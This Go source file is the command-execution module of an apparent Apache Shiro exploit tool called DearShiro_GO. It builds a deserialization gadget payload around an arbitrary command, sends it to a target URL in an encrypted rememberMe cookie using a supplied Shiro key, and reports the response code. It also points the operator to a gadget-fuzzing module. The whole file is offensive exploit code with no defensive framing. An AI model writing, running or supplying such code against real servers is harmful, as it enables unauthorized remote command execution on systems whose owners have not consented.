package exec

import (
	"DearShiro_GO/core/conn"
	"DearShiro_GO/core/data"
	"fmt"
	"net/url"
	"os"
	"strconv"
)

type CommandExecutor struct {
	TargetUrl      *url.URL
	TargetShiroKey string
	Gadget         string
}

func (this *CommandExecutor) Exec(command string) {
	payloadMap := data.NewPayloadMap()
	serialData, err := payloadMap.GetPayload(this.Gadget, command)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		fmt.Fprintln(os.Stderr, "may be you can use {gfuzz} module to fuzz the available gadget")
		os.Exit(0)
	}

	connection := &conn.Connection{BaseUrl: this.TargetUrl}
	fmt.Println("[*] Use Key: " + this.TargetShiroKey)
	fmt.Printf("[+] Use Gadget: %s, Execute Command: %s\n", this.Gadget, command)
	response := connection.SendRememberMe([]byte(this.TargetShiroKey), serialData)
	fmt.Println("[-] Response Code: " + strconv.Itoa(response.StatusCode))
}
